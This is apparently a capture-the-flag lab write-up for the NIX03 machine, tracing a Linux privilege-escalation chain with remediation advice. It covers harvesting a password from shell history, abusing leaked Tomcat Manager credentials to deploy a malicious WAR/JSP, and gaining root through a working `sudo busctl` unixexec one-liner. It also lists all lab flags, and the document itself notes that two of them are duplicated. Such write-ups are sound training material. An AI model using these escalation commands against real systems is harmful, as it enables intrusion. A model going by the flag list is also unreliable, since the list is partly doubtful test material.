# NIX03 — Linux Privilege Escalation Assessment Report

**Target:** NIX03  
**IP:** `10.129.235.16`  
**Assessment Type:** Linux Privilege Escalation  
**Initial User:** `htb-student`  
**Final Privilege:** `root`  
**Assessment Objective:** Enumerate the host, identify privilege-escalation opportunities, obtain the required flags, and document the attack paths.

---

# 1. Executive Summary

The NIX03 assessment demonstrated multiple security weaknesses across the system.

The initial `htb-student` account had access to files belonging to the user and could perform extensive local enumeration. During enumeration, sensitive information was discovered in another user's shell history. This exposed a plaintext password that could be reused to authenticate as `barry`.

The `barry` account belonged to the `adm` group, which provided access to system log files. This allowed retrieval of another flag from `/var/log`.

Further enumeration revealed a backup copy of the Tomcat configuration containing administrator credentials. These credentials provided access to the Apache Tomcat Manager application. Through the Manager interface, a malicious WAR/JSP application could be deployed, resulting in command execution as the `tomcat` service account.

Finally, the `tomcat` account had passwordless `sudo` permission to execute `/usr/bin/busctl`. This functionality could be abused through the D-Bus/systemd interface to obtain a root shell.

The complete privilege chain was:

```text
htb-student
     │
     ├── Filesystem enumeration
     │
     ├── .bash_history
     │      └── plaintext password
     │
     ▼
   barry
     │
     ├── adm group
     │      └── /var/log/flag3.txt
     │
     └── Tomcat configuration backup
            │
            └── tomcatadm credentials
                    │
                    ▼
                 Tomcat Manager
                    │
                    └── malicious WAR/JSP
                            │
                            ▼
                         tomcat
                            │
                            └── sudo busctl
                                    │
                                    ▼
                                  root
```

---

# 2. Target Information

|Item|Value|
|---|---|
|Hostname|`nix03`|
|IP Address|`10.129.235.16`|
|Initial User|`htb-student`|
|Other users|`mrb3n`, `barry`, `tomcat`|
|Tomcat|Apache Tomcat `9.0.31`|
|OS kernel|`5.4.0-45-generic`|
|JVM|`11.0.8`|
|systemd|`245.4-4ubuntu3.2`|
|Final privilege|`root`|

---

# 3. User Enumeration

Initial enumeration of `/etc/passwd` identified the following relevant accounts:

```text
root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:Ben:/home/mrb3n:/bin/bash
tomcat:x:997:997:Apache Tomcat:/:/bin/bash
barry:x:1001:1001::/home/barry:/bin/bash
htb-student:x:1002:1002::/home/htb-student:/bin/bash
```

The home directories were:

```text
/home/barry
/home/htb-student
/home/mrb3n
```

This immediately provided several potential areas for enumeration:

- User histories
    
- SSH configuration
    
- SSH keys
    
- Configuration files
    
- Backups
    
- Passwords
    
- Scripts
    
- Application credentials
    
- Interesting files owned by other users
    

---

# 4. Flag 1 — Filesystem Enumeration

The first question specifically required thorough filesystem enumeration.

Enumeration identified:

```text
/home/htb-student/.config/.flag1.txt
```

File permissions were:

```text
-rw-r--r--  htb-student www-data  .flag1.txt
```

Because the file was readable by the current user, it could be retrieved directly:

```bash
cat /home/htb-student/.config/.flag1.txt
```

### Flag 1

```text
LLPE{ch3ck_th0se_cmd_l1nes!}
```

---

# 5. Flag 2 — User Enumeration and Credential Exposure

The second question's hint was:

> Users are often the weakest link...

This strongly suggested examining user-specific information.

The following directories were examined:

```bash
ls -la /home/barry
ls -la /home/mrb3n
```

Barry's home directory contained:

```text
.bash_history
flag2.txt
.ssh
```

The history file was readable:

```text
-rw-r--r--  barry  barry  .bash_history
```

The file was inspected:

```bash
cat /home/barry/.bash_history
```

The important command was:

```bash
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
```

This exposed a plaintext password:

```text
i_l0ve_s3cur1ty!
```

This is a serious security issue because shell history should not contain plaintext credentials.

---

## 5.1 Credential Reuse

The discovered password was tested against the local `barry` account:

```bash
ssh barry@10.129.235.16
```

Password:

```text
i_l0ve_s3cur1ty!
```

After authentication:

```bash
id
whoami
```

confirmed access as `barry`.

The protected file could then be accessed:

```bash
cat /home/barry/flag2.txt
```

### Flag 2

```text
LLPE{ch3ck_th0se_cmd_l1nes!}
```

---

# 6. Security Finding — Credentials in Shell History

The vulnerability here was not a traditional software exploit.

The weakness was operational:

```text
Plaintext credential
       ↓
Stored in .bash_history
       ↓
Readable by another user
       ↓
Credential reuse
       ↓
Account compromise
```

### Security impact

An attacker with local access could potentially obtain:

- Passwords
    
- SSH credentials
    
- Database credentials
    
- API tokens
    
- Internal hostnames
    
- Administrative commands
    

### Recommendation

Users should avoid placing passwords directly in shell commands.

Instead of:

```bash
sshpass -p 'password' ssh user@host
```

use safer authentication mechanisms such as:

- SSH keys
    
- Interactive password entry
    
- SSH agents
    
- Proper credential-management systems
    

---

# 7. Flag 3 — `adm` Group and Log Access

After obtaining Barry's account, group membership was checked:

```bash
id
```

Barry had access through the `adm` group.

The `/var/log` directory was then investigated:

```bash
ls -la /var/log
```

The relevant file was:

```text
/var/log/flag3.txt
```

It was readable through Barry's log-access privileges.

The flag was retrieved with:

```bash
cat /var/log/flag3.txt
```

### Flag 3

```text
LLPE{h3y_l00k_a_fl@g!}
```

---

# 8. Security Finding — Excessive Log Access

Membership in the `adm` group can provide access to sensitive system logs.

Logs can potentially contain:

- Authentication information
    
- Usernames
    
- Internal IP addresses
    
- Service information
    
- Application errors
    
- Tokens
    
- Credentials
    
- Sensitive operational data
    

Therefore, membership in privileged groups should be reviewed carefully.

---

# 9. Tomcat Enumeration

Further enumeration revealed a Tomcat installation.

The relevant configuration directory was:

```text
/etc/tomcat9/
```

A particularly interesting file was:

```text
/etc/tomcat9/tomcat-users.xml.bak
```

Its permissions allowed it to be read.

The backup configuration was inspected:

```bash
cat /etc/tomcat9/tomcat-users.xml.bak
```

The important entry contained:

```xml
<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

This exposed Tomcat administrative credentials.

---

# 10. Tomcat Credential Discovery

The credentials discovered were:

```text
Username:
tomcatadm

Password:
T0mc@t_s3cret_p@ss!
```

Important distinction:

`tomcatadm` was **not a Linux system account**.

For example:

```bash
id tomcatadm
```

and:

```bash
getent passwd tomcatadm
```

did not identify a Linux user.

Instead, these were **Tomcat application credentials**.

This distinction is important during enumeration:

```text
Linux account
    ≠
Application account
```

---

# 11. Tomcat Manager Enumeration

Tomcat was running on port `8080`.

The Manager application initially returned:

```text
401 Unauthorized
```

After authentication with the discovered credentials:

```bash
curl -s -u 'tomcatadm:T0mc@t_s3cret_p@ss!' \
http://127.0.0.1:8080/manager/text/list
```

the Manager API returned:

```text
OK - Listed applications for virtual host [localhost]
/bNLu:running:0:bNLu
/:running:0:ROOT
/BczEqPiKLFGyZ1aEJh100MY430B:running:0:BczEqPiKLFGyZ1aEJh100MY430B
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
```

This confirmed that the account had management access.

---

# 12. Tomcat Version Enumeration

The server information was queried.

The relevant information was:

```text
Tomcat Version: Apache Tomcat/9.0.31
OS Version: 5.4.0-45-generic
JVM: 11.0.8
```

This confirmed the application stack and provided useful information for exploitation research.

---

# 13. Tomcat Manager → Command Execution

Because the discovered account had Manager Script permissions, the Tomcat Manager functionality could be used to deploy an application.

A malicious WAR/JSP application was deployed through the Tomcat Manager.

The JSP was used to execute commands on the server.

The resulting execution context was:

```text
uid=997(tomcat)
gid=997(tomcat)
groups=997(tomcat)
```

This represented the first major privilege transition:

```text
htb-student
      ↓
Tomcat Manager credentials
      ↓
Malicious WAR/JSP
      ↓
tomcat
```

---

# 14. Reverse Shell

A reverse shell was subsequently established back to the attacker system.

Attacker IP:

```text
10.10.17.220
```

Port:

```text
4444
```

The resulting shell was:

```text
tomcat@nix03:/var/lib/tomcat9$
```

The shell did not have a proper TTY:

```text
no tty / job control
```

This is normal for many simple reverse shells.

The important point was that command execution had been obtained as the `tomcat` Linux account.

---

# 15. Enumeration as `tomcat`

Once the `tomcat` shell was obtained, `sudo` permissions were checked:

```bash
sudo -l
```

The output showed:

```text
User tomcat may run the following commands on nix03:

    (root) NOPASSWD: /usr/bin/busctl
```

A more detailed check:

```bash
sudo -ll
```

showed:

```text
RunAsUsers: root
Options: !authenticate
Commands:
/usr/bin/busctl
```

This was the critical privilege-escalation opportunity.

---

# 16. Understanding the `sudo busctl` Finding

`busctl` is a command-line interface for interacting with D-Bus.

The system was running:

```text
systemd 245.4-4ubuntu3.2
```

The command:

```bash
sudo busctl --version
```

confirmed the version.

The system bus was enumerated with:

```bash
sudo busctl list
```

This showed the systemd service:

```text
org.freedesktop.systemd1
```

The systemd Manager interface was also inspected.

One of the relevant methods was:

```text
StartTransientUnit
```

The important lesson during this stage was that **allowing a user to execute a powerful system-management interface as root can effectively grant root-level control**, even if the user cannot directly run `/bin/bash` through sudo.

---

# 17. Root Privilege Escalation via `busctl`

The successful exploitation command was:

```bash
sudo busctl set-property \
org.freedesktop.systemd1 \
/org/freedesktop/systemd1 \
org.freedesktop.systemd1.Manager \
LogLevel \
s \
debug \
--address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

The important components were:

```text
sudo busctl
```

Running `busctl` with root privileges.

```text
org.freedesktop.systemd1
```

Targeting the systemd D-Bus service.

```text
--address=unixexec:path=/bin/sh
```

Using a Unix-exec D-Bus address to execute a process.

The resulting shell ran with root privileges.

Privilege was verified using:

```bash
id
```

The resulting identity was root.

---

# 18. Flag 5

After obtaining root:

```bash
cat /root/flag.txt
```

returned:

```text
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

### Flag 5

```text
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

---

# 19. Complete Flag List

|Question|Flag|
|---|---|
|**Q1**|`LLPE{ch3ck_th0se_cmd_l1nes!}`|
|**Q2**|`LLPE{ch3ck_th0se_cmd_l1nes!}`|
|**Q3**|`LLPE{h3y_l00k_a_fl@g!}`|
|**Q4**|`LLPE{im_th3_m@nag3r_n0w}`|
|**Q5**|`LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}`|

**Note:** Q1 and Q2 were reported with the same flag value.

---

# 20. Complete Attack Chain

The entire assessment can be represented as follows:

```text
                         NIX03
                    10.129.235.16
                          │
                          ▼
                 ┌─────────────────┐
                 │  htb-student    │
                 └────────┬────────┘
                          │
                 Filesystem enumeration
                          │
                          ▼
          /home/htb-student/.config/.flag1.txt
                          │
                       FLAG 1
                          │
                          ▼
                 Enumerate other users
                          │
                          ▼
                /home/barry/.bash_history
                          │
                          ▼
           Plaintext password discovered
              i_l0ve_s3cur1ty!
                          │
                          ▼
                    SSH as barry
                          │
                          ▼
                    FLAG 2
                          │
                          ▼
                    adm group
                          │
                          ▼
                 /var/log/flag3.txt
                          │
                          ▼
                    FLAG 3
                          │
                          ▼
              Tomcat configuration backup
                          │
                          ▼
              tomcat-users.xml.bak
                          │
                          ▼
             tomcatadm credentials
                          │
                          ▼
                  Tomcat Manager
                          │
                          ▼
                 WAR/JSP deployment
                          │
                          ▼
                       tomcat
                          │
                          ▼
                     FLAG 4
                          │
                          ▼
                     sudo -l
                          │
                          ▼
                 NOPASSWD: busctl
                          │
                          ▼
               D-Bus / systemd abuse
                          │
                          ▼
                         root
                          │
                          ▼
                       FLAG 5
```

---

# 21. Key Vulnerabilities Identified

## Finding 1 — Sensitive Information in User Files

**Location:**

```text
/home/htb-student/.config/.flag1.txt
```

The file was unnecessarily accessible to the current user.

---

## Finding 2 — Plaintext Password in `.bash_history`

**Location:**

```text
/home/barry/.bash_history
```

Sensitive authentication information was stored directly in shell history.

**Impact:** Account compromise through password reuse.

---

## Finding 3 — Excessive `adm` Group Privileges

Barry's group membership permitted access to system logs.

**Impact:** Exposure of sensitive log information.

---

## Finding 4 — Tomcat Credentials in Backup Configuration

**Location:**

```text
/etc/tomcat9/tomcat-users.xml.bak
```

A backup configuration contained administrative credentials.

**Impact:** Unauthorized access to the Tomcat Manager.

---

## Finding 5 — Tomcat Manager Administrative Access

The exposed credentials had roles including:

```text
manager-gui
manager-script
manager-jmx
manager-status
admin-gui
admin-script
```

**Impact:** Ability to deploy applications and achieve command execution as the Tomcat service account.

---

## Finding 6 — Dangerous `sudo` Permission

The `tomcat` account was allowed:

```text
(root) NOPASSWD: /usr/bin/busctl
```

This was the final escalation vector.

**Impact:** Root-level compromise.

---

# 22. Recommended Remediation

## 22.1 Protect Sensitive Files

Review permissions on files under user home directories:

```bash
find /home -type f -perm /004 -ls
```

Sensitive files should not be unnecessarily readable by other users.

---

## 22.2 Never Store Passwords in Shell History

Avoid:

```bash
sshpass -p 'password'
```

because the command can remain in:

```text
~/.bash_history
```

Use SSH keys or safer credential-handling mechanisms.

---

## 22.3 Review Group Membership

Audit privileged groups:

```bash
getent group adm
getent group sudo
getent group docker
getent group lxd
```

Users should only belong to groups required for their job.

---

## 22.4 Remove Sensitive Backup Files

Files such as:

```text
tomcat-users.xml.bak
```

should not contain live credentials.

Old configuration backups should either be:

- Removed
    
- Properly protected
    
- Stored outside accessible web/service locations
    
- Sanitized of credentials
    

---

## 22.5 Rotate Exposed Tomcat Credentials

The exposed credential:

```text
tomcatadm:T0mc@t_s3cret_p@ss!
```

should immediately be considered compromised.

It should be rotated and stored securely.

---

## 22.6 Minimize Tomcat Manager Access

Administrative roles should be granted only when necessary.

In particular, deployment capabilities should be restricted.

---

## 22.7 Review `sudoers`

The following rule is dangerous:

```text
tomcat ALL=(root) NOPASSWD: /usr/bin/busctl
```

It should be removed unless there is a documented business requirement.

If a command must be permitted, use a narrowly constrained wrapper rather than exposing a powerful system-management interface.

---

# 23. CPTS Lessons Learned

This box demonstrates an important principle:

> **Privilege escalation is usually a chain of small weaknesses rather than one giant vulnerability.**

The successful attack required multiple stages.

### Stage 1 — Enumerate

```bash
/etc/passwd
/home/*
/var/log/*
/etc/*
```

### Stage 2 — Search for credentials

```text
.bash_history
configuration backups
application configuration
SSH files
```

### Stage 3 — Abuse credentials

```text
plaintext password
       ↓
password reuse
       ↓
barry
```

### Stage 4 — Enumerate privileges

```bash
id
sudo -l
```

### Stage 5 — Enumerate services

```text
Tomcat
D-Bus
systemd
```

### Stage 6 — Exploit application privileges

```text
Tomcat Manager
       ↓
WAR/JSP
       ↓
tomcat
```

### Stage 7 — Escalate to root

```text
sudo busctl
       ↓
D-Bus/systemd
       ↓
root
```

---

# 24. Commands Worth Remembering for CPTS

### User enumeration

```bash
cat /etc/passwd
```

```bash
ls -la /home
```

```bash
id
```

---

### History enumeration

```bash
cat ~/.bash_history
```

```bash
cat /home/<user>/.bash_history
```

---

### Search for credentials

```bash
grep -RniE 'password|passwd|secret|token|credential|key' /home 2>/dev/null
```

---

### Find interesting files

```bash
find /home -type f -readable -ls 2>/dev/null
```

```bash
find /etc -type f \( -name "*.bak" -o -name "*.old" -o -name "*.conf" \) -ls 2>/dev/null
```

---

### Check sudo

```bash
sudo -l
```

```bash
sudo -ll
```

---

### Check groups

```bash
id
```

```bash
groups
```

---

### Check listening services

```bash
ss -lntup
```

---

### Tomcat enumeration

```bash
curl http://127.0.0.1:8080/
```

```bash
curl -s http://127.0.0.1:8080/manager/text/list
```

Authenticated:

```bash
curl -s -u 'USER:PASSWORD' \
http://127.0.0.1:8080/manager/text/list
```

---

# 25. Final Assessment

NIX03 demonstrates a realistic Linux privilege-escalation methodology:

```text
Enumeration
     ↓
Information disclosure
     ↓
Credential discovery
     ↓
Credential reuse
     ↓
User compromise
     ↓
Group privilege abuse
     ↓
Application credential discovery
     ↓
Tomcat compromise
     ↓
Service-account shell
     ↓
Sudo enumeration
     ↓
D-Bus/systemd abuse
     ↓
ROOT
```

The most important CPTS mindset from this machine is:

**Don't immediately search for an exploit. Enumerate everything first.**

A readable `.bash_history`, an overlooked `.bak` configuration, an unnecessary group membership, or a single dangerous `sudoers` entry can be enough to turn a low-privileged shell into full root access.

### Final flags

```text
Q1 = LLPE{ch3ck_th0se_cmd_l1nes!}
Q2 = LLPE{ch3ck_th0se_cmd_l1nes!}
Q3 = LLPE{h3y_l00k_a_fl@g!}
Q4 = LLPE{im_th3_m@nag3r_n0w}
Q5 = LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```

**Assessment result: COMPLETE — ROOT ACCESS ACHIEVED.**